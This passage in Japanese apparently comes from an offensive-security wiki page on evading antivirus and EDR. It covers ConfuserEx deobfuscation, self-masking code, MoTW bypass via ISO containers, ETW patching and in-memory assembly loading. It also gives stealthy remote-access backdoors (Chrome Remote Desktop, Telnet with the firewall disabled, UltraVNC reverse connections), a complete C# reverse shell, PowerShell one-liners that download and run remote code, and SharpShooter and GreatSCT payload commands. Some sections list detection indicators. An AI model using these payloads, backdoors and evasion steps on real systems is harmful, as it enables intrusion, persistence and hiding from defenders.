3.  Proxy-call stripping – ConfuserExは、逆コンパイルをさらに妨げるため、直接のmethod callを軽量なwrapper（いわゆる*proxy call*）に置き換えます。**ProxyCall-Remover**で削除します：
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   この手順の後、難読化されたラッパー関数（`Class8.smethod_10` など）ではなく、`Convert.FromBase64String` や `AES.Create()` のような通常の .NET API が確認できるはずです。

4.  手動クリーンアップ – 生成されたバイナリを dnSpy で実行し、大きな Base64 blob や `RijndaelManaged`／`TripleDESCryptoServiceProvider` の使用箇所を検索して、*本物の* payload を特定します。多くの場合、マルウェアは `<Module>.byte_0` 内で初期化される TLV エンコード済みバイト配列として payload を保存しています。

この一連の手順では、悪意のあるサンプルを実行せずに実行フローを復元できます。オフラインのワークステーションで作業するときに便利です。

> 🛈  ConfuserEx は `ConfusedByAttribute` というカスタム属性を生成します。これは IOC として使用し、サンプルを自動的にトリアージできます。

#### ワンライナー
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/) compilation suiteのオープンソースforkを提供し、[code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>)とtamper-proofingによってソフトウェアのセキュリティを高めることです。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使わず、compilerも変更せずに、`C++11/14`言語を使ってコンパイル時にobfuscated codeを生成する方法を実演します。
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming frameworkで生成したobfuscated operationsのレイヤーを追加し、アプリケーションをcrackしようとする人の作業を少し難しくします。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまなpe filesをobfuscateできるx64 binary obfuscatorです。
- [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行ファイル向けのシンプルなmetamorphic code engineです。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP (return-oriented programming)を使用する、LLVMがサポートする言語向けの細粒度なcode obfuscation frameworkです。ROPfuscatorは、通常の命令をROP chainsに変換してassembly codeレベルでプログラムをobfuscateし、通常のcontrol flowに対する直感を覆します。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PE Crypterです。
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをshellcodeに変換してロードできます。

### LLVM compiler-assisted per-function self-masking

implant全体をスリープ中だけmaskする代わりに、変更したLLVM X86 backendを使うと、選択した関数が非アクティブな間、常にXOR-maskされた状態にできます。Function Peekaboo PoCは、mangled nameに`REG_`を含む関数を選び、最終的なmachine codeの前後にposition-independentなentry/exit stubsを挿入し、共有のmasking handlerを`.text`に出力します。ソースレベルのsignatureとWindows x64 calling conventionは変更されません。<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

この処理は、命令選択と最適化の後に行う必要があります。すべての出力対象returnを処理し、正確なx86レイアウトを把握する必要があるためです。出力前の`MachineFunctionPass`は、最後の`MachineInstr::isReturn()`を見つけて削除し、最終経路が追加したepilogueへフォールスルーするようにします。それ以前のreturnは`JMP_1 handler`に置き換えます。各returnの前にある、compilerが生成したstack/frameのteardownは残し、return命令自体だけをリダイレクトしてください。<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()`と`emitFunctionBodyEnd()`は関数ごとのstubsを出力し、`emitEndOfAsmFile()`はhandlerを出力します。出力段階間で共有するシンボルを使えば、prologueのbranchから後に出力されるepilogueへ分岐できます。near `je`を手動で出力する場合は、`0F 84`の後に、4バイトのMC expression `target - address_after_je`を書き込みます。handlerへのcallsとjumpsは、`MCInst`オブジェクト（`CALL64pcrel32`と`JMP_1`）として出力することもできます。変更していない関数に対しては、passは`false`を返す必要がありますが、PoCはその経路で誤って`true`を返します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata and pre-CRT initialization

PoCは、XOR keyと、loaderによってrelocateされた関数ポインターおよび実行時の長さを含む16バイトのレコードを`.funcmeta`に配置します。Cのフィールドは`uint32_t`ですが、handlerはレコードのオフセット`+8`にあるQWORDを読み取るため、長さとそのpaddingを消費し、レコードを`0x10`ずつ進めます。PEのsection nameは最大8バイトなので、実行時の検索では`.funcmet`として認識されます。外部patcherは実行可能な`.stub`を追加し、stub内に以前のentry-point RVAを保存して、`AddressOfEntryPoint`をリダイレクトします。このPIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsをたどって、すでにimport済みの`VirtualProtect`を解決してから、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

初期化時に`gs:[0xE8]`へsentinelを設定し、metadata内のすべての関数を呼び出します。常に読み取り可能なprologueは関数の開始位置を`gs:[0xF0]`に記録し、sentinelを検出すると、まだclear状態のbodyをスキップします。次にepilogueが`call handler`を実行します。handlerが13個のregister（`0x68` bytes）を保存した後、`[rsp+0x68]`にあるreturn addressが変換後の関数の終端になるため、`end - start`をそのmetadata recordに書き込めます。すべてのbodyをmaskした後、stubはsentinelをクリアし、`ImageBase + original_entry_point_RVA`へジャンプします。<sup>[[38]](#references)[[39]](#references)</sup>

通常の呼び出しでは、prologueが同じ対称handlerを呼び出してbodyをdecodeします。最終経路は追加されたepilogueへフォールスルーし、それ以前のreturnはすべて共有handlerへ直接ジャンプします。通常のepilogueも`call`ではなく`jmp handler`を使うため、再度maskした後、handlerの`ret`は元のcallerのreturn addressを消費し、関数の戻り値を`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerは現在のrecordを見つけ、固定された可視prologue（このbuildでは`0x46` bytes）をスキップし、残りを`PAGE_EXECUTE_READWRITE`に変更します。続いて、低位のkey byteでbyte-by-byteにXORし、最後に`PAGE_EXECUTE_READ`に設定します。この同じloopが、関数のentry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

この設計を示す重要度の高いindicatorは次のとおりです。<sup>[[38]](#references)[[39]](#references)</sup>

- 実行可能な`.stub`内にあるentry pointと、keyおよびrelocateされた`.text` pointersを格納する`.funcmet` section。
- pre-CRTでのPEB、import table、section tableの解析と、その後に続く各metadata pointer経由の呼び出し。
- 同一の`call`/`pop` PIC prologuesと、1つのhandlerにリダイレクトされた多数のreturn sites。
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`への書き込み、その後に繰り返される`VirtualProtect`による保護属性の変更、およびimage-backedな実行可能ページへのbyte単位のXOR書き込み。

これはmemory-scanner evasionであり、暗号学的な保護ではありません。patchされたファイルには元のclear bodyが残っており、debuggerで`VirtualProtect`やXOR loopにbreakを設定すれば、実行中の関数をdumpできます。1バイトのXOR、読み取り可能なmetadata、固定の`0x46`境界も、オフラインでの復元を容易にします。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotsはthread-localですが、変更されたcode pagesはprocess-wideです。そのため、並行または再帰的なentryが発生すると、別の呼び出しが実行中にも命令が再度切り替わる可能性があります。また、例外やnonlocal exitによって再maskが回避されることもあります。堅牢な実装では、切り替えを同期し、`lpflOldProtect`を通じて返された実際の保護属性を復元し、hard-codeされたstub lengthsを避け、x64のstack alignmentについて`call`と`jmp`の両方の経路を監査し、実行可能なbyteを書き換えた後に`FlushInstructionCache`を呼び出す必要があります。Microsoftは、実行可能なコードを変更する場合、instruction-cacheの整合性を保つ責任は呼び出し側にあると明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから実行ファイルをダウンロードして実行すると、この画面が表示されることがあります。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションの実行からエンドユーザーを保護するためのセキュリティ機能です。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-basedな方式で動作します。つまり、あまりダウンロードされていないアプリケーションはSmartScreenを起動させ、エンドユーザーに警告してファイルの実行を防ぎます（ただし、More Info -> Run anywayをクリックすれば実行できます）。

**MoTW** (Mark of The Web)は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)で、インターネットからファイルをダウンロードすると、そのダウンロード元のURLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認する。</p></figcaption></figure>

> [!TIP]
> **信頼された**署名証明書で署名された実行ファイルでは、**SmartScreenは起動しない**ことに注意してください。

payloadにMark of The Webが付かないようにする非常に効果的な方法は、ISOなどのコンテナにpayloadを格納することです。これは、Mark-of-the-Web (MOTW)を**NTFS以外**のボリュームには適用できないためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するため、payloadを出力コンテナに格納するツールです。

使用例:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

SmartScreen をバイパスするため、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使って payload を ISO ファイルにパッケージ化するデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、アプリケーションやシステムコンポーネントが**イベントをログに記録**できる、Windows の強力なログ記録機構です。ただし、セキュリティ製品が悪意のある活動を監視・検出するために利用することもあります。

AMSI を無効化（バイパス）するのと同様に、ユーザースペースプロセスの **`EtwEventWrite`** 関数を、イベントをログに記録せず即座に戻るようにすることも可能です。関数をメモリ上でパッチして即座に戻るようにすることで、そのプロセスの ETW ログ記録を実質的に無効化します。

詳しくは **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) と [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# バイナリをメモリ上にロードする手法は以前から知られており、AV に検出されずに post-exploitation ツールを実行する優れた方法として、現在も広く使われています。

payload はディスクに触れることなく直接メモリにロードされるため、プロセス全体で AMSI をパッチすることだけを考慮すればよいです。

ほとんどの C2 フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havoc など）は、すでに C# アセンブリをメモリ上で直接実行する機能を備えていますが、実行方法はいくつかあります。

- **Fork\&Run**

**新しい使い捨てプロセスを起動**し、そのプロセスに post-exploitation の悪意あるコードをインジェクトして実行し、完了したら新しいプロセスを終了します。この方法には利点と欠点の両方があります。Fork and Run の利点は、実行が Beacon implant プロセスの**外部**で行われることです。つまり、post-exploitation の処理で問題が起きたり検出されたりしても、**implant が生き残る可能性が大幅に高くなります**。欠点は、**Behavioural Detections** に検出される**可能性が高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitation の悪意あるコードを**自身のプロセス内に**インジェクトする方法です。新しいプロセスを作成して AV にスキャンされるのを避けられますが、payload の実行中に問題が発生すると、クラッシュによって **beacon を失う可能性が大幅に高くなります**。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly のロードについて詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) を確認してください。

**PowerShell から** C# Assembly をロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t の動画](https://www.youtube.com/watch?v=oe11Q-3Akuk)を確認してください。

## .NET ツールを NativeAOT WebAssembly に再パッケージ化する（WasmForge）

通常の `execute-assembly` 技法では、識別可能な MSIL が残り、最終的に CLR が初期化されます。**WasmForge** は実行基盤そのものを変更します。C# プロジェクトを実験的な NativeAOT-LLVM WASI ターゲットに移行し、事前に WebAssembly にコンパイルしてから、そのモジュールを Wazero ベースの Windows PE ホストに埋め込みます。生成されたプロセスは対象環境の CLR、JIT、`dotnet` ホストを必要としないため、マネージドアセンブリ名、CLR のロード、AMSI、.NET ETW のみに基づくルールからは直接検知されにくくなります。これは回避・パッケージ化の技法であり、権限境界をバイパスするものではありません。ゲストは元のツールと同じ権限を持ち、OS 上で観測される動作も元のツールと同じです。<sup>[[44]](#references)[[45]](#references)</sup>

### C# プロジェクトのビルド

推奨されるビルド方法は、プロジェクトの Docker 環境を使用することです。この環境には .NET 10 SDK、NativeAOT-LLVM workload、WASI SDK 24.0、リンカー、署名に必要な依存関係が含まれています。`.csproj` は自動検出され、1 回のビルドで移行、互換性パッチの適用、WASM のコンパイル、PE の生成、署名が実行されます。<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

生成コードのトラブルシューティングやレビューでは、プロセスを `wasmforge dotnet-migrate <dir>`、`wasmforge dotnet-patch <dir>`、`dotnet publish -c Release -r wasi-wasm`、最後に `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` に分割します。ビルドイメージでは `wasm-component-ld` ラッパーも使用し、WASI Preview 2 の component encoding を避けて、埋め込みランタイムが想定するプレーンなモジュールを生成します。<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# と x64 Win32 のブリッジ

これは透過的な再コンパイルではありません。NativeAOT-WASI では Windows 向けの BCL 機能が不足または変更されており、wasm32 ゲストは通常4バイトのポインタスロットを割り当てますが、x64 API は8バイトのポインタを返すことがあります。WasmForge は、次の生成レイヤーで両方の問題に対処します。<sup>[[44]](#references)</sup>

1. ソースパッチャーが AOT 固有のセマンティクスの違いを修正し、サポートされていない registry、pipes、WMI、identity、directory-service、file-version、LSA などの呼び出しを `Wf*` ヘルパーにリダイレクトします。
2. P/Invoke スキャナーが NativeAOT の `DirectPInvoke` マッピングを生成し、`[DllImport]` 呼び出しが、ゲスト内で宣言された DLL を動的に読み込むのではなく、リンク済みの C bridge シンボルにバインドされるようにします。
3. ホストに渡すポインタには、C# では `ulong`、C では `uint64_t` を使用します。汎用ディスパッチャーが呼び出しをホストの Win32 ハンドラーに転送し、`out8_mask` が、上位半分を保持する必要がある実際の8バイト出力スロットを示します。マークされていない wasm32 形式の出力にはスナップショット／復元による保護を適用し、x64 の書き込みで隣接する4バイトが破損しないようにします。
4. 専用のホストブリッジが、汎用 syscall ディスパッチに適さない操作を処理します。たとえば、LSA ticket-cache へのアクセス、構造化された結果を伴う Kerberos/BCrypt 操作、TCP KDC トラフィック、LDAP クエリなどです。

たとえば、`version.dll!VerQueryValueW` のラッパーは4つのホストアドレスを渡し、値ポインタと長さが8バイトの出力スロットであるため、ビット2と3（`0xC`）を設定します。ラッパー自体は汎用のままで、DLL 名、export 名、引数、マスクを `wf_call_v2` に渡します。ホストがポインタを変換し、ネイティブ API を呼び出します。<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### 制限事項と検出の手掛かり

Reflectionを多用するコード、動的なアセンブリの読み込み、任意のネイティブコールバック、WASMメモリに返される複雑なx64構造体は、ツールごとのパッチが必要になる場合や、まったく動作しない場合があります。汎用のWASI Preview 2ソケットもno-opスタブに到達することがあるため、サポート対象のツールではプロトコル固有のhost shimを使用します。機能が同等だと決めつけず、各コマンドをネイティブビルドと照合して検証してください。<sup>[[44]](#references)[[45]](#references)</sup>

この手法はtelemetryを移すものであり、payloadを見えなくするものではありません。検出の手掛かりとして、WASMモジュールを含む、または実体化するPE、Wazeroのようなruntimeの動作、通常とは異なるhost/guestメモリの割り当てやコピー、汎用的なWin32の直接呼び出し、署名やPEリソースの異常、さらにその結果生じるAPI呼び出しやネットワークトラフィックに注目できます。したがって、CLRの読み込み、AMSI、または.NET ETWのイベントがないことを、プロセスが無害である証拠とみなすべきではありません。<sup>[[44]](#references)</sup>

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、**侵害したマシンから、Attacker Controlled SMB shareにインストールされたインタープリター環境へアクセスできるようにする**ことで、他の言語を使って悪意のあるコードを実行できます。

SMB share上のインタープリターのバイナリと環境へのアクセスを許可すると、侵害したマシンの**メモリ内でこれらの言語による任意のコードを実行**できます。

リポジトリによると、Defenderはスクリプトを引き続きスキャンしますが、Go、Java、PHPなどを活用すれば、**静的シグネチャを回避する柔軟性が高まります**。これらの言語でランダムな難読化されていないreverse shellスクリプトを使ったテストでは、成功が確認されています。

## 静的解析回避のためのWebAssemblyの再ホスト

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stompingは、EDRやAVなどのセキュリティ製品のaccess tokenを操作します。tokenの権限を下げることで、プロセスを稼働させたまま、特権を必要とする検査や修復の操作を実行できないようにできます。

これを防ぐために、Windowsは**外部プロセス**がセキュリティプロセスのtokenに対するハンドルを取得できないようにすることができます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## 信頼されたソフトウェアの使用

### Chrome Remote Desktop

[**このブログ記事**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)で説明されているように、被害者のPCにChrome Remote Desktopをインストールして乗っ取り、永続化に利用するのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からダウンロードし、"Set up via SSH"をクリックしてから、Windows用のMSIファイルをクリックしてダウンロードします。
2. 被害者のマシンでインストーラーをサイレント実行します（管理者権限が必要です）。`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktopのページに戻り、nextをクリックします。ウィザードで認証を求められたら、Authorizeボタンをクリックして続行します。
4. 必要な箇所を変更して、提示されたコマンドを実行します。`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin`パラメーターを使うと、GUIを使わずにPINを設定できます）。
 

## 高度なEvasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasionは非常に複雑なトピックです。1つのシステム内でも、多くの異なるtelemetryソースを考慮しなければならない場合があります。そのため、成熟した環境で完全に検知されずにいるのは、ほぼ不可能です。

対処する環境には、それぞれ固有の強みと弱みがあります。

高度なEvasion手法を理解するために、[@ATTL4S](https://twitter.com/DaniLJ94)のこの講演を見ることを強くおすすめします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

こちらも、[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthについての優れた講演です。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **古い手法**

### **Defenderが悪意のあるものと判定する箇所の確認**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使うと、**Defenderが悪意のあるものと判定する箇所を特定するまでバイナリの一部を削除し**、その箇所を分離できます。\
**同じことを行う**別のツールに[**avred**](https://github.com/dobin/avred)があり、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)でWebサービスとして公開されています。

### **Telnet Server**

Windows 10以前のすべてのWindowsには、管理者としてインストールできる**Telnet server**が付属していました。次のように実行できます。

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

システム起動時に**起動**するように設定し、今すぐ**実行**してください:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnetポートを変更（ステルス）し、ファイアウォールを無効化する：**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

こちらからダウンロードします: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setupではなく、bin downloadsを選択します)

**ホスト上で**: _**winvnc.exe**_ を実行し、サーバーを設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ にパスワードを設定する
- _View-Only Password_ にパスワードを設定する

次に、バイナリ _**winvnc.exe**_ と**新たに**作成されたファイル _**UltraVNC.ini**_ を**victim**に移動します

#### **逆方向接続**

**attacker**は、逆方向の**VNC接続**を受け付けられるように、自分の**ホスト上で**バイナリ `vncviewer.exe -listen 5900` を**実行**します。次に、**victim**上で winvnc デーモンを起動します `winvnc.exe -run`。続けて `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルスを維持するため、次の操作は行わないでください

- `winvnc` がすでに実行中の場合は起動しないでください。[popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中かどうかを確認します
- 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。[config window](https://i.imgur.com/rfMQWcf.png) が開きます
- ヘルプを表示するために `winvnc -h` を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

こちらからダウンロードします: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT内:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

次に `msfconsole -r file.rc` で **リスナーを起動**し、以下の **xml payload** を **実行**します。

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**現在の Defender はプロセスを非常に速く終了させます。**

### 独自の reverse shell をコンパイルする

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初の C# reverse shell

次のようにコンパイルします:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

次のように使用します：

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# コンパイラを使用する

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行：

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators の一覧: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector のビルドに Python を使用する例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のツール

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### その他

